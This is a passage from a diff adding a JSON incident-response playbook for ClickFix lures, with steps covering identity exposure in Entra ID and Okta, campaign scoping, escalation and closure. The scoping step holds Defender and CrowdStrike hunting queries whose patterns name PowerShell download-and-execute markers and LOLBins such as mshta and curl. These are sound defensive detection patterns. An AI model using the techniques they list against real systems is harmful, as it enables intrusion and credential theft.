+          "label": "Discovery / credential-access activity",
+          "type": "textarea"
+        },
+        {
+          "id": "tools",
+          "label": "Additional tools / tunnels / RMMs dropped",
+          "type": "textarea"
+        },
+        {
+          "id": "lateral",
+          "label": "Lateral movement attempts from this host",
+          "type": "textarea"
+        }
+      ],
+      "next": "identity-exposure"
+    },
+    "identity-exposure": {
+      "type": "step",
+      "title": "Assess identity and data exposure",
+      "instructions": "Assume every credential and session available to the user on that host is compromised: browser-saved passwords (including personal and third-party SaaS), browser session cookies (which bypass MFA via token replay), and anything typed while a RAT was active. Sessions were revoked at containment — now look for use of what was stolen.\n\nMICROSOFT ENTRA ID:\n- Entra admin center > Sign-in logs (interactive AND non-interactive) for the user from the execution time forward: new IPs/ASNs/countries, unfamiliar devices or user agents, sign-ins shortly after execution from hosting/VPS providers.\n- Identity Protection > Risky users / Risk detections: 'Anomalous token', 'Unfamiliar sign-in properties', 'Anonymous IP', 'Atypical travel'.\n- Defender Advanced hunting:\n    AADSignInEventsBeta\n    | where AccountUpn =~ \"<user@domain>\" and Timestamp > datetime(<T>)\n    | project Timestamp, Application, IPAddress, Country, City, UserAgent, ErrorCode, RiskLevelDuringSignIn\n- Audit logs: new MFA methods registered, new app consents/OAuth grants, password changes.\n- Mailbox (BEC follow-on): new inbox rules (forwarding, moving to RSS/Archive, deleting), mail forwarding set, unusual mail sent.\n\nOKTA:\n- Reports > System Log: actor.alternateId eq \"<user@domain>\" — review user.session.start, user.authentication.*, policy.evaluate_sign_on, and app SSO events after execution. Look for new client.ipAddress / ASN (securityContext), new user agents, and sessions from hosting providers.\n- Look for MFA changes: eventType eq \"user.mfa.factor.activate\" or \"user.mfa.factor.reset_all\", and admin-privilege use if the user is an admin.\n- Okta ThreatInsight / Identity Threat Protection signals (session hijack, entity risk) if enabled.\n\nREMEDIATE / NOTIFY:\n- Confirm password reset and session revocation completed in both IdPs; re-verify MFA factors and remove any the user did not enroll.\n- Rotate any secrets on the host: API keys, cloud CLI credentials (~/.aws, ~/.azure), SSH keys, VPN profiles, password manager if its vault was unlocked.\n- Advise the user to change personal passwords saved in that browser and to review any crypto wallets.\n- If the user is privileged (admin, finance, IT), escalate severity.",
+      "evidence": [
+        {
+          "id": "entra",
+          "label": "Entra findings (sign-ins / risk / MFA / consents / inbox rules)",
+          "type": "textarea"
+        },
+        {
+          "id": "okta",
+          "label": "Okta findings (sessions / new IPs / MFA changes)",
+          "type": "textarea"
+        },
+        {
+          "id": "secrets",
+          "label": "Other secrets/credentials exposed and rotated",
+          "type": "textarea"
+        },
+        {
+          "id": "misuse",
+          "label": "Evidence of stolen credential/session use? (yes/no + detail)",
+          "type": "text"
+        }
+      ],
+      "next": "scope"
+    },
+    "scope": {
+      "type": "step",
+      "title": "Scope the campaign and blast radius",
+      "instructions": "Determine how many users and hosts were hit by this lure and payload, and how far the attacker got.\n\n- Fleet hunt for the command/infrastructure: RunMRU and process-command-line searches for the extracted domains/IPs (queries in the lure-block step), payload hash hunts (CrowdStrike IOC 'Hosts seen' / Defender DeviceFileEvents by SHA256), and C2 domain/IP hunts (Umbrella across all identities; Defender DeviceNetworkEvents; CrowdStrike DnsRequest/NetworkConnectIP4).\n- Generic ClickFix sweep to catch other lures in the same campaign (different domains, same technique):\n    Defender: DeviceProcessEvents | where Timestamp > ago(14d) and InitiatingProcessFileName =~ \"explorer.exe\" and FileName in~ (\"powershell.exe\",\"mshta.exe\",\"cmd.exe\",\"msiexec.exe\",\"curl.exe\") and ProcessCommandLine matches regex @\"(?i)(https?://|iex|irm|iwr|-enc|captcha|robot|verif)\"\n    CrowdStrike: #event_simpleName=ProcessRollup2 ParentBaseFileName=explorer.exe FileName=/^(powershell|mshta|cmd|msiexec|curl)\\.exe$/i CommandLine=/(https?:|iex|irm|iwr|-enc|captcha|robot|verif)/i\n- Email scope (Avanan): all recipients of the lure email; confirm quarantine from every mailbox.\n- Build a timeline: lure delivery -> page visit -> paste/execution -> payload -> C2/exfil -> any identity misuse -> containment.\n- List every affected host and account; each host that executed needs its own containment (return to the containment step for it).\n- Assess data reach: what the stolen identities could access (email, SharePoint/OneDrive, Okta-federated SaaS, privileged systems).",
+      "evidence": [
+        {
+          "id": "hunt",
+          "label": "Fleet-wide hunt results (hosts / users hit)",
+          "type": "textarea"
+        },
+        {
+          "id": "timeline",
+          "label": "Timeline: delivery -> execution -> payload -> exfil/misuse -> containment",
+          "type": "textarea"
+        },
+        {
+          "id": "affected",
+          "label": "All affected hosts & accounts, and data reachable",
+          "type": "textarea"
+        }
+      ],
+      "next": "escalate",
+      "playbook": "SCOPING"
+    },
+    "escalate": {
+      "type": "terminal",
+      "title": "Escalate to incident response",
+      "instructions": "ClickFix execution with payload delivery confirmed (or not ruled out); host(s) contained, identity actions taken, and scope established.\n\n- Ensure the process chain, decoded command, lure/delivery path, payload family, C2/exfil destinations, identity findings, timeline, and all containment actions are recorded above.\n- Assign severity per your matrix — raise it for privileged users, evidence of session/credential misuse, hands-on-keyboard activity, or multiple affected hosts.\n- Notify the on-call IR owner and hand over the preserved volatile evidence and samples.\n- Note control gaps for post-incident review: was the first stage detected but not prevented? Did Umbrella allow the lure/payload domain? Consider hardening such as restricting the Run dialog for standard users via GPO, PowerShell Constrained Language Mode / script-block logging, ASR rules, and blocking mshta.exe where not needed.\n- Reimage the host under the IR playbook; do not return a stealer/RAT-infected host to service on a scan result alone.",
+      "disposition": "escalated",
+      "playbook": "IR-HANDOFF",
+      "summary": "ClickFix execution delivered a payload; host contained, identity sessions revoked, campaign scoped, and escalated to IR."
+    },
+    "close-blocked": {
+      "type": "terminal",
+      "title": "Close — ClickFix attempted, blocked, verified clean",
+      "instructions": "The user ran a ClickFix command, but it was stopped before any payload executed, and verification found nothing further. No other hosts executed it.\n\n- Document the process chain, decoded command, lure, what blocked it (EDR prevention, Umbrella, Meraki, AMSI), and the clean verification.\n- Confirm all IOCs are blocked (Umbrella, Meraki, CrowdStrike, Defender, Avanan).\n- Record the user brief/awareness action. As a precaution, many teams still revoke the user's sessions — note whether that was done.\n- Note any control improvement opportunities (e.g. why the first stage was not prevented if only the payload fetch was blocked).",
+      "disposition": "closed",
+      "playbook": "TUNE-AND-CLOSE",
+      "summary": "ClickFix attempt blocked before payload execution; host verified clean, infrastructure blocked, no other victims; closed."
+    },
+    "benign-close": {
+      "type": "terminal",
+      "title": "Close — verified legitimate command (false positive)",
+      "instructions": "The command was a legitimate administrative or developer action, not a social-engineering lure.\n\n- Document who ran it, the exact command, the fetched domain/content, and how legitimacy was verified (user confirmation plus vendor/internal domain and content review).\n- Propose narrow tuning (specific command line + domain + user/group), never a blanket exclusion for explorer.exe -> powershell.exe.\n- If the user ran a remote-fetch-and-execute one-liner from the internet, even a legitimate one, note the risky practice and point them to approved software deployment channels.",
+      "disposition": "closed",
+      "playbook": "TUNE-AND-CLOSE",
+      "summary": "Command verified as legitimate admin/developer activity, not ClickFix; documented and narrow tuning proposed."
+    }
+  }
+}
